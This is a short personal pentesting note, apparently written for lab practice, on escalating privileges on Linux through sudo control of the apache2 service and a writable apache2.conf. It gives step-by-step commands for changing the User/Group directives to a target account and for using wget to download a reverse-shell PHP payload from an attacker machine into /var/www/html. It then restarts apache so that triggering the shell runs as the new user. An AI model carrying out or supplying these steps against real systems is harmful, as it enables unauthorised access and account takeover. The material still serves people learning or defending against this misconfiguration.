-- -
If you can use sudo to run `systemctl` on #apache2 and control the service, and you can write to the config located at `/etc/apache2/apache2.conf`, then you can get use it to pivot into another user without credentials. 
### Resources
- [Where I learned the technique](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/)
### Sudo
You should see something like the following when you do `sudo -l`
![[Pasted image 20250129162244.png]]
If you are working in a reverse shell from the web app, then you may **need** to be able to restart the service, otherwise you can get away with start and stop. **If you restart the service on a webshell from the web app, the restart will boot you, if it works you can get it back**.
### apache2.conf
You will need to do the following:
```bash
ls -la /etc/apache2/apache2.conf
# you need write privs to it
```
Edit the file if you can with vim or nano or whatever. If default-ish, you should find:
```bash
# These need to be set in /etc/apache2/envvars
User www-data
Group www-data
```
Edit this section to whatever user you want to pivot to, you can try root but it didn't work when I learned it. 
```bash
# These need to be set in /etc/apache2/envvars
User mahakal
Group mahakal
```

If you can't open a text editor, you can just copy the output of the file to your attackbox and then edit it there, then do a [[Dark Arts I/File Transfer/~Home|file transfer]] or something like wget to overwrite the original:
```bash
wget -O apache2.conf http://192.168.45.158/apache2.conf
```
### Reverse shell
If you use the previous reverse shell method, the user will change if you do it again. You can also just put an easy reverse shell on the web server:
```bash
# in transfer folder with reverse shell
sudo python -m http.server 80

# then on the target
# note web server may be located elsewhere or with different directory names, but given this is for apache, it will be somwhere around here
cd /var/www/html

# then just
wget http://192.168.45.158/rev_shell.php

# then just go to it in your browser to trigger it
```
### Restart Apache Service
Now just restart the service to apply the new config. Remember if you are on a webshell, you will get booted off and if you messed anything up you will have closed the vector and have to restart the machine. 
```bash
sudo /bin/systemctl restart apache2
```
### hit the rev shell
Now either trigger the original exploit to get a reverse shell, or trigger the reverse shell you setup above and you should be the new user instead you specified in the config. 
